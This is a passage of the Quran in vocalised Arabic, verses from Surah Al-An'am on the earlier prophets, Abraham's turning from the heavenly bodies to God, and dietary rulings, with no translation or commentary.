وَلَقَدْ كُذِّبَتْ رُسُلٌ مِّنْ قَبْلِكَ فَصَبَرُوْا عَلٰى مَا كُذِّبُوْا وَاُوْذُوْا حَتّٰىٓ اَتٰىهُمْ نَصْرُنَا ۚ وَلَا مُبَدِّلَ لِكَلِمٰتِ اللّٰهِ ۚ وَلَقَدْ جَاۤءَكَ مِنْ نَّبَا۟ىِ الْمُرْسَلِيْنَ
وَاِنْ كَانَ كَبُرَ عَلَيْكَ اِعْرَاضُهُمْ فَاِنِ اسْتَطَعْتَ اَنْ تَبْتَغِيَ نَفَقًا فِى الْاَرْضِ اَوْ سُلَّمًا فِى السَّمَاۤءِ فَتَأْتِيَهُمْ بِاٰيَةٍ ۗ وَلَوْ شَاۤءَ اللّٰهُ لَجَمَعَهُمْ عَلَى الْهُدٰى فَلَا تَكُوْنَنَّ مِنَ الْجٰهِلِيْنَ
اِنَّمَا يَسْتَجِيْبُ الَّذِيْنَ يَسْمَعُوْنَ ۘ وَالْمَوْتٰى يَبْعَثُهُمُ اللّٰهُ ثُمَّ اِلَيْهِ يُرْجَعُوْنَ
وَقَالُوْا لَوْلَا نُزِّلَ عَلَيْهِ اٰيَةٌ مِّنْ رَّبِّهٖ ۗ قُلْ اِنَّ اللّٰهَ قَادِرٌ عَلٰٓى اَنْ يُّنَزِّلَ اٰيَةً وَّلٰكِنَّ اَكْثَرَهُمْ لَا يَعْلَمُوْنَ
وَمَا مِنْ دَاۤبَّةٍ فِى الْاَرْضِ وَلَا طٰۤىِٕرٍ يَّطِيْرُ بِجَنَاحَيْهِ اِلَّآ اُمَمٌ اَمْثَالُكُمْ ۗ مَا فَرَّطْنَا فِى الْكِتٰبِ مِنْ شَيْءٍ ثُمَّ اِلٰى رَبِّهِمْ يُحْشَرُوْنَ
وَالَّذِيْنَ كَذَّبُوْا بِاٰيٰتِنَا صُمٌّ وَّبُكْمٌ فِى الظُّلُمٰتِ ۗ مَنْ يَّشَاِ اللّٰهُ يُضْلِلْهُ ۚ وَمَنْ يَّشَأْ يَجْعَلْهُ عَلٰى صِرَاطٍ مُّسْتَقِيْمٍ
قُلْ اَرَءَيْتَكُمْ اِنْ اَتٰىكُمْ عَذَابُ اللّٰهِ اَوْ اَتَتْكُمُ السَّاعَةُ اَغَيْرَ اللّٰهِ تَدْعُوْنَ ۚ اِنْ كُنْتُمْ صٰدِقِيْنَ
بَلْ اِيَّاهُ تَدْعُوْنَ فَيَكْشِفُ مَا تَدْعُوْنَ اِلَيْهِ اِنْ شَاۤءَ وَتَنْسَوْنَ مَا تُشْرِكُوْنَ
وَلَقَدْ اَرْسَلْنَآ اِلٰٓى اُمَمٍ مِّنْ قَبْلِكَ فَاَخَذْنٰهُمْ بِالْبَأْسَاۤءِ وَالضَّرَّاۤءِ لَعَلَّهُمْ يَتَضَرَّعُوْنَ
فَلَوْلَآ اِذْ جَاۤءَهُمْ بَأْسُنَا تَضَرَّعُوْا وَلٰكِنْ قَسَتْ قُلُوْبُهُمْ وَزَيَّنَ لَهُمُ الشَّيْطٰنُ مَا كَانُوْا يَعْمَلُوْنَ
فَلَمَّا نَسُوْا مَا ذُكِّرُوْا بِهٖ فَتَحْنَا عَلَيْهِمْ اَبْوَابَ كُلِّ شَيْءٍ ۗ حَتّٰىٓ اِذَا فَرِحُوْا بِمَآ اُوْتُوْٓا اَخَذْنٰهُمْ بَغْتَةً فَاِذَا هُمْ مُّبْلِسُوْنَ
فَقُطِعَ دَابِرُ الْقَوْمِ الَّذِيْنَ ظَلَمُوْا ۗ وَالْحَمْدُ لِلّٰهِ رَبِّ الْعٰلَمِيْنَ
قُلْ اَرَءَيْتُمْ اِنْ اَخَذَ اللّٰهُ سَمْعَكُمْ وَاَبْصَارَكُمْ وَخَتَمَ عَلٰى قُلُوْبِكُمْ مَّنْ اِلٰهٌ غَيْرُ اللّٰهِ يَأْتِيْكُمْ بِهٖ ۗ اُنْظُرْ كَيْفَ نُصَرِّفُ الْاٰيٰتِ ثُمَّ هُمْ يَصْدِفُوْنَ
قُلْ اَرَءَيْتَكُمْ اِنْ اَتٰىكُمْ عَذَابُ اللّٰهِ بَغْتَةً اَوْ جَهْرَةً هَلْ يُهْلَكُ اِلَّا الْقَوْمُ الظّٰلِمُوْنَ
وَمَا نُرْسِلُ الْمُرْسَلِيْنَ اِلَّا مُبَشِّرِيْنَ وَمُنْذِرِيْنَ ۚ فَمَنْ اٰمَنَ وَاَصْلَحَ فَلَا خَوْفٌ عَلَيْهِمْ وَلَا هُمْ يَحْزَنُوْنَ
وَالَّذِيْنَ كَذَّبُوْا بِاٰيٰتِنَا يَمَسُّهُمُ الْعَذَابُ بِمَا كَانُوْا يَفْسُقُوْنَ
قُلْ لَّآ اَقُوْلُ لَكُمْ عِنْدِيْ خَزَاۤىِٕنُ اللّٰهِ وَلَآ اَعْلَمُ الْغَيْبَ وَلَاۤ اَقُوْلُ لَكُمْ اِنِّيْ مَلَكٌ ۚ اِنْ اَتَّبِعُ اِلَّا مَا يُوْحٰٓى اِلَيَّ ۗ قُلْ هَلْ يَسْتَوِى الْاَعْمٰى وَالْبَصِيْرُ ۗ اَفَلَا تَتَفَكَّرُوْنَ
وَاَنْذِرْ بِهِ الَّذِيْنَ يَخَافُوْنَ اَنْ يُّحْشَرُوْٓا اِلٰى رَبِّهِمْ لَيْسَ لَهُمْ مِّنْ دُوْنِهٖ وَلِيٌّ وَّلَا شَفِيْعٌ لَّعَلَّهُمْ يَتَّقُوْنَ
وَلَا تَطْرُدِ الَّذِيْنَ يَدْعُوْنَ رَبَّهُمْ بِالْغَدٰوةِ وَالْعَشِيِّ يُرِيْدُوْنَ وَجْهَهٗ ۗ مَا عَلَيْكَ مِنْ حِسَابِهِمْ مِّنْ شَيْءٍ وَّمَا مِنْ حِسَابِكَ عَلَيْهِمْ مِّنْ شَيْءٍ فَتَطْرُدَهُمْ فَتَكُوْنَ مِنَ الظّٰلِمِيْنَ
وَكَذٰلِكَ فَتَنَّا بَعْضَهُمْ بِبَعْضٍ لِّيَقُوْلُوْٓا اَهٰٓؤُلَاۤءِ مَنَّ اللّٰهُ عَلَيْهِمْ مِّنْۢ بَيْنِنَا ۗ اَلَيْسَ اللّٰهُ بِاَعْلَمَ بِالشّٰكِرِيْنَ
وَاِذَا جَاۤءَكَ الَّذِيْنَ يُؤْمِنُوْنَ بِاٰيٰتِنَا فَقُلْ سَلٰمٌ عَلَيْكُمْ كَتَبَ رَبُّكُمْ عَلٰى نَفْسِهِ الرَّحْمَةَ ۙ اَنَّهٗ مَنْ عَمِلَ مِنْكُمْ سُوْۤءًا بِجَهَالَةٍ ثُمَّ تَابَ مِنْۢ بَعْدِهٖ وَاَصْلَحَ فَاَنَّهٗ غَفُوْرٌ رَّحِيْمٌ
وَكَذٰلِكَ نُفَصِّلُ الْاٰيٰتِ وَلِتَسْتَبِيْنَ سَبِيْلُ الْمُجْرِمِيْنَ
قُلْ اِنِّيْ نُهِيْتُ اَنْ اَعْبُدَ الَّذِيْنَ تَدْعُوْنَ مِنْ دُوْنِ اللّٰهِ ۗ قُلْ لَّآ اَتَّبِعُ اَهْوَاۤءَكُمْ ۙ قَدْ ضَلَلْتُ اِذًا وَّمَآ اَنَا۠ مِنَ الْمُهْتَدِيْنَ
قُلْ اِنِّيْ عَلٰى بَيِّنَةٍ مِّنْ رَّبِّيْ وَكَذَّبْتُمْ بِهٖ ۗ مَا عِنْدِيْ مَا تَسْتَعْجِلُوْنَ بِهٖ ۗ اِنِ الْحُكْمُ اِلَّا لِلّٰهِ ۚ يَقُصُّ الْحَقَّ وَهُوَ خَيْرُ الْفٰصِلِيْنَ
قُلْ لَّوْ اَنَّ عِنْدِيْ مَا تَسْتَعْجِلُوْنَ بِهٖ لَقُضِيَ الْاَمْرُ بَيْنِيْ وَبَيْنَكُمْ ۗ وَاللّٰهُ اَعْلَمُ بِالظّٰلِمِيْنَ
وَعِنْدَهٗ مَفَاتِحُ الْغَيْبِ لَا يَعْلَمُهَآ اِلَّا هُوَ ۗ وَيَعْلَمُ مَا فِى الْبَرِّ وَالْبَحْرِ ۗ وَمَا تَسْقُطُ مِنْ وَّرَقَةٍ اِلَّا يَعْلَمُهَا وَلَا حَبَّةٍ فِيْ ظُلُمٰتِ الْاَرْضِ وَلَا رَطْبٍ وَّلَا يَابِسٍ اِلَّا فِيْ كِتٰبٍ مُّبِيْنٍ
وَهُوَ الَّذِيْ يَتَوَفّٰىكُمْ بِالَّيْلِ وَيَعْلَمُ مَا جَرَحْتُمْ بِالنَّهَارِ ثُمَّ يَبْعَثُكُمْ فِيْهِ لِيُقْضٰٓى اَجَلٌ مُّسَمًّى ۚ ثُمَّ اِلَيْهِ مَرْجِعُكُمْ ثُمَّ يُنَبِّئُكُمْ بِمَا كُنْتُمْ تَعْمَلُوْنَ
وَهُوَ الْقَاهِرُ فَوْقَ عِبَادِهٖ وَيُرْسِلُ عَلَيْكُمْ حَفَظَةً ۗ حَتّٰىٓ اِذَا جَاۤءَ اَحَدَكُمُ الْمَوْتُ تَوَفَّتْهُ رُسُلُنَا وَهُمْ لَا يُفَرِّطُوْنَ
ثُمَّ رُدُّوْٓا اِلَى اللّٰهِ مَوْلٰىهُمُ الْحَقِّ ۗ اَلَا لَهُ الْحُكْمُ ۚ وَهُوَ اَسْرَعُ الْحٰسِبِيْنَ
قُلْ مَنْ يُّنَجِّيْكُمْ مِّنْ ظُلُمٰتِ الْبَرِّ وَالْبَحْرِ تَدْعُوْنَهٗ تَضَرُّعًا وَّخُفْيَةً ۚ لَىِٕنْ اَنْجٰىنَا مِنْ هٰذِهٖ لَنَكُوْنَنَّ مِنَ الشّٰكِرِيْنَ
قُلِ اللّٰهُ يُنَجِّيْكُمْ مِّنْهَا وَمِنْ كُلِّ كَرْبٍ ثُمَّ اَنْتُمْ تُشْرِكُوْنَ
قُلْ هُوَ الْقَادِرُ عَلٰٓى اَنْ يَّبْعَثَ عَلَيْكُمْ عَذَابًا مِّنْ فَوْقِكُمْ اَوْ مِنْ تَحْتِ اَرْجُلِكُمْ اَوْ يَلْبِسَكُمْ شِيَعًا وَّيُذِيْقَ بَعْضَكُمْ بَأْسَ بَعْضٍ ۗ اُنْظُرْ كَيْفَ نُصَرِّفُ الْاٰيٰتِ لَعَلَّهُمْ يَفْقَهُوْنَ
وَكَذَّبَ بِهٖ قَوْمُكَ وَهُوَ الْحَقُّ ۗ قُلْ لَّسْتُ عَلَيْكُمْ بِوَكِيْلٍ
لِكُلِّ نَبَاٍ مُّسْتَقَرٌّ ۚ وَسَوْفَ تَعْلَمُوْنَ
وَاِذَا رَاَيْتَ الَّذِيْنَ يَخُوْضُوْنَ فِيْٓ اٰيٰتِنَا فَاَعْرِضْ عَنْهُمْ حَتّٰى يَخُوْضُوْا فِيْ حَدِيْثٍ غَيْرِهٖ ۗ وَاِمَّا يُنْسِيَنَّكَ الشَّيْطٰنُ فَلَا تَقْعُدْ بَعْدَ الذِّكْرٰى مَعَ الْقَوْمِ الظّٰلِمِيْنَ
وَمَا عَلَى الَّذِيْنَ يَتَّقُوْنَ مِنْ حِسَابِهِمْ مِّنْ شَيْءٍ وَّلٰكِنْ ذِكْرٰى لَعَلَّهُمْ يَتَّقُوْنَ
وَذَرِ الَّذِيْنَ اتَّخَذُوْا دِيْنَهُمْ لَعِبًا وَّلَهْوًا وَّغَرَّتْهُمُ الْحَيٰوةُ الدُّنْيَا وَذَكِّرْ بِهٖٓ اَنْ تُبْسَلَ نَفْسٌ ۢ بِمَا كَسَبَتْ ۖ لَيْسَ لَهَا مِنْ دُوْنِ اللّٰهِ وَلِيٌّ وَّلَا شَفِيْعٌ ۚ وَاِنْ تَعْدِلْ كُلَّ عَدْلٍ لَّا يُؤْخَذْ مِنْهَا ۗ اُولٰۤىِٕكَ الَّذِيْنَ اُبْسِلُوْا بِمَا كَسَبُوْا ۚ لَهُمْ شَرَابٌ مِّنْ حَمِيْمٍ وَّعَذَابٌ اَلِيْمٌ ۢ بِمَا كَانُوْا يَكْفُرُوْنَ
قُلْ اَنَدْعُوْا مِنْ دُوْنِ اللّٰهِ مَا لَا يَنْفَعُنَا وَلَا يَضُرُّنَا وَنُرَدُّ عَلٰٓى اَعْقَابِنَا بَعْدَ اِذْ هَدٰىنَا اللّٰهُ كَالَّذِى اسْتَهْوَتْهُ الشَّيٰطِيْنُ فِى الْاَرْضِ حَيْرَانَ ۖ لَهٗٓ اَصْحٰبٌ يَّدْعُوْنَهٗٓ اِلَى الْهُدَى ائْتِنَا ۚ قُلْ اِنَّ هُدَى اللّٰهِ هُوَ الْهُدٰى ۗ وَاُمِرْنَا لِنُسْلِمَ لِرَبِّ الْعٰلَمِيْنَ
وَاَنْ اَقِيْمُوا الصَّلٰوةَ وَاتَّقُوْهُ ۗ وَهُوَ الَّذِيْٓ اِلَيْهِ تُحْشَرُوْنَ
وَهُوَ الَّذِيْ خَلَقَ السَّمٰوٰتِ وَالْاَرْضَ بِالْحَقِّ ۗ وَيَوْمَ يَقُوْلُ كُنْ فَيَكُوْنُ ۗ قَوْلُهُ الْحَقُّ ۗ وَلَهُ الْمُلْكُ يَوْمَ يُنْفَخُ فِى الصُّوْرِ ۗ عٰلِمُ الْغَيْبِ وَالشَّهَادَةِ ۗ وَهُوَ الْحَكِيْمُ الْخَبِيْرُ
وَاِذْ قَالَ اِبْرٰهِيْمُ لِاَبِيْهِ اٰزَرَ اَتَتَّخِذُ اَصْنَامًا اٰلِهَةً ۚ اِنِّيْٓ اَرٰىكَ وَقَوْمَكَ فِيْ ضَلٰلٍ مُّبِيْنٍ
وَكَذٰلِكَ نُرِيْٓ اِبْرٰهِيْمَ مَلَكُوْتَ السَّمٰوٰتِ وَالْاَرْضِ وَلِيَكُوْنَ مِنَ الْمُوْقِنِيْنَ
فَلَمَّا جَنَّ عَلَيْهِ الَّيْلُ رَاٰ كَوْكَبًا ۚ قَالَ هٰذَا رَبِّيْ ۚ فَلَمَّآ اَفَلَ قَالَ لَآ اُحِبُّ الْاٰفِلِيْنَ
فَلَمَّا رَاَ الْقَمَرَ بَازِغًا قَالَ هٰذَا رَبِّيْ ۚ فَلَمَّآ اَفَلَ قَالَ لَىِٕنْ لَّمْ يَهْدِنِيْ رَبِّيْ لَاَكُوْنَنَّ مِنَ الْقَوْمِ الضَّاۤلِّيْنَ
فَلَمَّا رَاَ الشَّمْسَ بَازِغَةً قَالَ هٰذَا رَبِّيْ هٰذَآ اَكْبَرُ ۚ فَلَمَّآ اَفَلَتْ قَالَ يٰقَوْمِ اِنِّيْ بَرِيْۤءٌ مِّمَّا تُشْرِكُوْنَ
اِنِّيْ وَجَّهْتُ وَجْهِيَ لِلَّذِيْ فَطَرَ السَّمٰوٰتِ وَالْاَرْضَ حَنِيْفًا ۖ وَّمَآ اَنَا۠ مِنَ الْمُشْرِكِيْنَ
وَحَاۤجَّهٗ قَوْمُهٗ ۗ قَالَ اَتُحَاۤجُّوْنِّيْ فِى اللّٰهِ وَقَدْ هَدٰىنِ ۗ وَلَآ اَخَافُ مَا تُشْرِكُوْنَ بِهٖٓ اِلَّآ اَنْ يَّشَاۤءَ رَبِّيْ شَيْـًٔا ۗ وَسِعَ رَبِّيْ كُلَّ شَيْءٍ عِلْمًا ۗ اَفَلَا تَتَذَكَّرُوْنَ
وَكَيْفَ اَخَافُ مَآ اَشْرَكْتُمْ وَلَا تَخَافُوْنَ اَنَّكُمْ اَشْرَكْتُمْ بِاللّٰهِ مَا لَمْ يُنَزِّلْ بِهٖ عَلَيْكُمْ سُلْطٰنًا ۗ فَاَيُّ الْفَرِيْقَيْنِ اَحَقُّ بِالْاَمْنِ ۚ اِنْ كُنْتُمْ تَعْلَمُوْنَ
اَلَّذِيْنَ اٰمَنُوْا وَلَمْ يَلْبِسُوْٓا اِيْمَانَهُمْ بِظُلْمٍ اُولٰۤىِٕكَ لَهُمُ الْاَمْنُ وَهُمْ مُّهْتَدُوْنَ
وَتِلْكَ حُجَّتُنَآ اٰتَيْنٰهَآ اِبْرٰهِيْمَ عَلٰى قَوْمِهٖ ۗ نَرْفَعُ دَرَجٰتٍ مَّنْ نَّشَاۤءُ ۗ اِنَّ رَبَّكَ حَكِيْمٌ عَلِيْمٌ
وَوَهَبْنَا لَهٗٓ اِسْحٰقَ وَيَعْقُوْبَ ۗ كُلًّا هَدَيْنَا ۚ وَنُوْحًا هَدَيْنَا مِنْ قَبْلُ وَمِنْ ذُرِّيَّتِهٖ دَاوٗدَ وَسُلَيْمٰنَ وَاَيُّوْبَ وَيُوْسُفَ وَمُوْسٰى وَهٰرُوْنَ ۗ وَكَذٰلِكَ نَجْزِى الْمُحْسِنِيْنَ
وَزَكَرِيَّا وَيَحْيٰى وَعِيْسٰى وَاِلْيَاسَ ۗ كُلٌّ مِّنَ الصّٰلِحِيْنَ
وَاِسْمٰعِيْلَ وَالْيَسَعَ وَيُوْنُسَ وَلُوْطًا ۗ وَكُلًّا فَضَّلْنَا عَلَى الْعٰلَمِيْنَ
وَمِنْ اٰبَاۤىِٕهِمْ وَذُرِّيّٰتِهِمْ وَاِخْوَانِهِمْ ۚ وَاجْتَبَيْنٰهُمْ وَهَدَيْنٰهُمْ اِلٰى صِرَاطٍ مُّسْتَقِيْمٍ
ذٰلِكَ هُدَى اللّٰهِ يَهْدِيْ بِهٖ مَنْ يَّشَاۤءُ مِنْ عِبَادِهٖ ۗ وَلَوْ اَشْرَكُوْا لَحَبِطَ عَنْهُمْ مَّا كَانُوْا يَعْمَلُوْنَ
اُولٰۤىِٕكَ الَّذِيْنَ اٰتَيْنٰهُمُ الْكِتٰبَ وَالْحُكْمَ وَالنُّبُوَّةَ ۚ فَاِنْ يَّكْفُرْ بِهَا هٰٓؤُلَاۤءِ فَقَدْ وَكَّلْنَا بِهَا قَوْمًا لَّيْسُوْا بِهَا بِكٰفِرِيْنَ
اُولٰۤىِٕكَ الَّذِيْنَ هَدَى اللّٰهُ فَبِهُدٰىهُمُ اقْتَدِهْ ۗ قُلْ لَّآ اَسْـَٔلُكُمْ عَلَيْهِ اَجْرًا ۗ اِنْ هُوَ اِلَّا ذِكْرٰى لِلْعٰلَمِيْنَ
وَمَا قَدَرُوا اللّٰهَ حَقَّ قَدْرِهٖٓ اِذْ قَالُوْا مَآ اَنْزَلَ اللّٰهُ عَلٰى بَشَرٍ مِّنْ شَيْءٍ ۗ قُلْ مَنْ اَنْزَلَ الْكِتٰبَ الَّذِيْ جَاۤءَ بِهٖ مُوْسٰى نُوْرًا وَّهُدًى لِّلنَّاسِ تَجْعَلُوْنَهٗ قَرَاطِيْسَ تُبْدُوْنَهَا وَتُخْفُوْنَ كَثِيْرًا ۚ وَعُلِّمْتُمْ مَّا لَمْ تَعْلَمُوْٓا اَنْتُمْ وَلَآ اٰبَاۤؤُكُمْ ۗ قُلِ اللّٰهُ ۙ ثُمَّ ذَرْهُمْ فِيْ خَوْضِهِمْ يَلْعَبُوْنَ
وَهٰذَا كِتٰبٌ اَنْزَلْنٰهُ مُبٰرَكٌ مُّصَدِّقُ الَّذِيْ بَيْنَ يَدَيْهِ وَلِتُنْذِرَ اُمَّ الْقُرٰى وَمَنْ حَوْلَهَا ۗ وَالَّذِيْنَ يُؤْمِنُوْنَ بِالْاٰخِرَةِ يُؤْمِنُوْنَ بِهٖ وَهُمْ عَلٰى صَلَاتِهِمْ يُحَافِظُوْنَ
وَمَنْ اَظْلَمُ مِمَّنِ افْتَرٰى عَلَى اللّٰهِ كَذِبًا اَوْ قَالَ اُوْحِيَ اِلَيَّ وَلَمْ يُوْحَ اِلَيْهِ شَيْءٌ وَّمَنْ قَالَ سَاُنْزِلُ مِثْلَ مَآ اَنْزَلَ اللّٰهُ ۗ وَلَوْ تَرٰىٓ اِذِ الظّٰلِمُوْنَ فِيْ غَمَرٰتِ الْمَوْتِ وَالْمَلٰۤىِٕكَةُ بَاسِطُوْٓا اَيْدِيْهِمْ ۚ اَخْرِجُوْٓا اَنْفُسَكُمُ ۗ اَلْيَوْمَ تُجْزَوْنَ عَذَابَ الْهُوْنِ بِمَا كُنْتُمْ تَقُوْلُوْنَ عَلَى اللّٰهِ غَيْرَ الْحَقِّ وَكُنْتُمْ عَنْ اٰيٰتِهٖ تَسْتَكْبِرُوْنَ
وَلَقَدْ جِئْتُمُوْنَا فُرَادٰى كَمَا خَلَقْنٰكُمْ اَوَّلَ مَرَّةٍ وَّتَرَكْتُمْ مَّا خَوَّلْنٰكُمْ وَرَاۤءَ ظُهُوْرِكُمْ ۚ وَمَا نَرٰى مَعَكُمْ شُفَعَاۤءَكُمُ الَّذِيْنَ زَعَمْتُمْ اَنَّهُمْ فِيْكُمْ شُرَكٰۤؤُا ۗ لَقَدْ تَّقَطَّعَ بَيْنَكُمْ وَضَلَّ عَنْكُمْ مَّا كُنْتُمْ تَزْعُمُوْنَ
اِنَّ اللّٰهَ فَالِقُ الْحَبِّ وَالنَّوٰى ۗ يُخْرِجُ الْحَيَّ مِنَ الْمَيِّتِ وَمُخْرِجُ الْمَيِّتِ مِنَ الْحَيِّ ۗ ذٰلِكُمُ اللّٰهُ فَاَنّٰى تُؤْفَكُوْنَ
فَالِقُ الْاِصْبَاحِۚ وَجَعَلَ الَّيْلَ سَكَنًا وَّالشَّمْسَ وَالْقَمَرَ حُسْبَانًا ۗ ذٰلِكَ تَقْدِيْرُ الْعَزِيْزِ الْعَلِيْمِ
وَهُوَ الَّذِيْ جَعَلَ لَكُمُ النُّجُوْمَ لِتَهْتَدُوْا بِهَا فِيْ ظُلُمٰتِ الْبَرِّ وَالْبَحْرِ ۗ قَدْ فَصَّلْنَا الْاٰيٰتِ لِقَوْمٍ يَّعْلَمُوْنَ
وَهُوَ الَّذِيْٓ اَنْشَاَكُمْ مِّنْ نَّفْسٍ وَّاحِدَةٍ فَمُسْتَقَرٌّ وَّمُسْتَوْدَعٌ ۗ قَدْ فَصَّلْنَا الْاٰيٰتِ لِقَوْمٍ يَّفْقَهُوْنَ
وَهُوَ الَّذِيْٓ اَنْزَلَ مِنَ السَّمَاۤءِ مَاۤءً ۚ فَاَخْرَجْنَا بِهٖ نَبَاتَ كُلِّ شَيْءٍ فَاَخْرَجْنَا مِنْهُ خَضِرًا نُّخْرِجُ مِنْهُ حَبًّا مُّتَرَاكِبًا ۚ وَمِنَ النَّخْلِ مِنْ طَلْعِهَا قِنْوَانٌ دَانِيَةٌ وَّجَنّٰتٍ مِّنْ اَعْنَابٍ وَّالزَّيْتُوْنَ وَالرُّمَّانَ مُشْتَبِهًا وَّغَيْرَ مُتَشَابِهٍ ۗ اُنْظُرُوْٓا اِلٰى ثَمَرِهٖٓ اِذَآ اَثْمَرَ وَيَنْعِهٖ ۗ اِنَّ فِيْ ذٰلِكُمْ لَاٰيٰتٍ لِّقَوْمٍ يُّؤْمِنُوْنَ
وَجَعَلُوْا لِلّٰهِ شُرَكَاۤءَ الْجِنَّ وَخَلَقَهُمْ وَخَرَقُوْا لَهٗ بَنِيْنَ وَبَنٰتٍۢ بِغَيْرِ عِلْمٍ ۗ سُبْحٰنَهٗ وَتَعٰلٰى عَمَّا يَصِفُوْنَ
بَدِيْعُ السَّمٰوٰتِ وَالْاَرْضِ ۗ اَنّٰى يَكُوْنُ لَهٗ وَلَدٌ وَّلَمْ تَكُنْ لَّهٗ صَاحِبَةٌ ۗ وَخَلَقَ كُلَّ شَيْءٍ ۚ وَهُوَ بِكُلِّ شَيْءٍ عَلِيْمٌ
ذٰلِكُمُ اللّٰهُ رَبُّكُمْ ۚ لَآ اِلٰهَ اِلَّا هُوَ ۚ خَالِقُ كُلِّ شَيْءٍ فَاعْبُدُوْهُ ۚ وَهُوَ عَلٰى كُلِّ شَيْءٍ وَّكِيْلٌ
لَّا تُدْرِكُهُ الْاَبْصَارُ وَهُوَ يُدْرِكُ الْاَبْصَارَ ۚ وَهُوَ اللَّطِيْفُ الْخَبِيْرُ
قَدْ جَاۤءَكُمْ بَصَاۤىِٕرُ مِنْ رَّبِّكُمْ ۚ فَمَنْ اَبْصَرَ فَلِنَفْسِهٖ ۚ وَمَنْ عَمِيَ فَعَلَيْهَا ۗ وَمَآ اَنَا۠ عَلَيْكُمْ بِحَفِيْظٍ
وَكَذٰلِكَ نُصَرِّفُ الْاٰيٰتِ وَلِيَقُوْلُوْا دَرَسْتَ وَلِنُبَيِّنَهٗ لِقَوْمٍ يَّعْلَمُوْنَ
اِتَّبِعْ مَآ اُوْحِيَ اِلَيْكَ مِنْ رَّبِّكَ ۚ لَآ اِلٰهَ اِلَّا هُوَ ۚ وَاَعْرِضْ عَنِ الْمُشْرِكِيْنَ
وَلَوْ شَاۤءَ اللّٰهُ مَآ اَشْرَكُوْا ۗ وَمَا جَعَلْنٰكَ عَلَيْهِمْ حَفِيْظًا ۚ وَمَآ اَنْتَ عَلَيْهِمْ بِوَكِيْلٍ
وَلَا تَسُبُّوا الَّذِيْنَ يَدْعُوْنَ مِنْ دُوْنِ اللّٰهِ فَيَسُبُّوا اللّٰهَ عَدْوًاۢ بِغَيْرِ عِلْمٍ ۗ كَذٰلِكَ زَيَّنَّا لِكُلِّ اُمَّةٍ عَمَلَهُمْ ۖ ثُمَّ اِلٰى رَبِّهِمْ مَّرْجِعُهُمْ فَيُنَبِّئُهُمْ بِمَا كَانُوْا يَعْمَلُوْنَ
وَاَقْسَمُوْا بِاللّٰهِ جَهْدَ اَيْمَانِهِمْ لَىِٕنْ جَاۤءَتْهُمْ اٰيَةٌ لَّيُؤْمِنُنَّ بِهَا ۗ قُلْ اِنَّمَا الْاٰيٰتُ عِنْدَ اللّٰهِ وَمَا يُشْعِرُكُمْ اَنَّهَآ اِذَا جَاۤءَتْ لَا يُؤْمِنُوْنَ
وَنُقَلِّبُ اَفْـِٔدَتَهُمْ وَاَبْصَارَهُمْ كَمَا لَمْ يُؤْمِنُوْا بِهٖٓ اَوَّلَ مَرَّةٍ وَّنَذَرُهُمْ فِيْ طُغْيَانِهِمْ يَعْمَهُوْنَ
وَلَوْ اَنَّنَا نَزَّلْنَآ اِلَيْهِمُ الْمَلٰۤىِٕكَةَ وَكَلَّمَهُمُ الْمَوْتٰى وَحَشَرْنَا عَلَيْهِمْ كُلَّ شَيْءٍ قُبُلًا مَّا كَانُوْا لِيُؤْمِنُوْٓا اِلَّآ اَنْ يَّشَاۤءَ اللّٰهُ وَلٰكِنَّ اَكْثَرَهُمْ يَجْهَلُوْنَ
وَكَذٰلِكَ جَعَلْنَا لِكُلِّ نَبِيٍّ عَدُوًّا شَيٰطِيْنَ الْاِنْسِ وَالْجِنِّ يُوْحِيْ بَعْضُهُمْ اِلٰى بَعْضٍ زُخْرُفَ الْقَوْلِ غُرُوْرًا ۗ وَلَوْ شَاۤءَ رَبُّكَ مَا فَعَلُوْهُ فَذَرْهُمْ وَمَا يَفْتَرُوْنَ
وَلِتَصْغٰٓى اِلَيْهِ اَفْـِٔدَةُ الَّذِيْنَ لَا يُؤْمِنُوْنَ بِالْاٰخِرَةِ وَلِيَرْضَوْهُ وَلِيَقْتَرِفُوْا مَا هُمْ مُّقْتَرِفُوْنَ
اَفَغَيْرَ اللّٰهِ اَبْتَغِيْ حَكَمًا وَّهُوَ الَّذِيْٓ اَنْزَلَ اِلَيْكُمُ الْكِتٰبَ مُفَصَّلًا ۗ وَالَّذِيْنَ اٰتَيْنٰهُمُ الْكِتٰبَ يَعْلَمُوْنَ اَنَّهٗ مُنَزَّلٌ مِّنْ رَّبِّكَ بِالْحَقِّ فَلَا تَكُوْنَنَّ مِنَ الْمُمْتَرِيْنَ
وَتَمَّتْ كَلِمَتُ رَبِّكَ صِدْقًا وَّعَدْلًا ۗ لَا مُبَدِّلَ لِكَلِمٰتِهٖ ۚ وَهُوَ السَّمِيْعُ الْعَلِيْمُ
وَاِنْ تُطِعْ اَكْثَرَ مَنْ فِى الْاَرْضِ يُضِلُّوْكَ عَنْ سَبِيْلِ اللّٰهِ ۗ اِنْ يَّتَّبِعُوْنَ اِلَّا الظَّنَّ وَاِنْ هُمْ اِلَّا يَخْرُصُوْنَ
اِنَّ رَبَّكَ هُوَ اَعْلَمُ مَنْ يَّضِلُّ عَنْ سَبِيْلِهٖ ۚ وَهُوَ اَعْلَمُ بِالْمُهْتَدِيْنَ
فَكُلُوْا مِمَّا ذُكِرَ اسْمُ اللّٰهِ عَلَيْهِ اِنْ كُنْتُمْ بِاٰيٰتِهٖ مُؤْمِنِيْنَ
وَمَا لَكُمْ اَلَّا تَأْكُلُوْا مِمَّا ذُكِرَ اسْمُ اللّٰهِ عَلَيْهِ وَقَدْ فَصَّلَ لَكُمْ مَّا حَرَّمَ عَلَيْكُمْ اِلَّا مَا اضْطُرِرْتُمْ اِلَيْهِ ۗ وَاِنَّ كَثِيْرًا لَّيُضِلُّوْنَ بِاَهْوَاۤىِٕهِمْ بِغَيْرِ عِلْمٍ ۗ اِنَّ رَبَّكَ هُوَ اَعْلَمُ بِالْمُعْتَدِيْنَ
وَذَرُوْا ظَاهِرَ الْاِثْمِ وَبَاطِنَهٗ ۗ اِنَّ الَّذِيْنَ يَكْسِبُوْنَ الْاِثْمَ سَيُجْزَوْنَ بِمَا كَانُوْا يَقْتَرِفُوْنَ
وَلَا تَأْكُلُوْا مِمَّا لَمْ يُذْكَرِ اسْمُ اللّٰهِ عَلَيْهِ وَاِنَّهٗ لَفِسْقٌ ۗ وَاِنَّ الشَّيٰطِيْنَ لَيُوْحُوْنَ اِلٰٓى اَوْلِيَاۤىِٕهِمْ لِيُجَادِلُوْكُمْ ۚ وَاِنْ اَطَعْتُمُوْهُمْ اِنَّكُمْ لَمُشْرِكُوْنَ
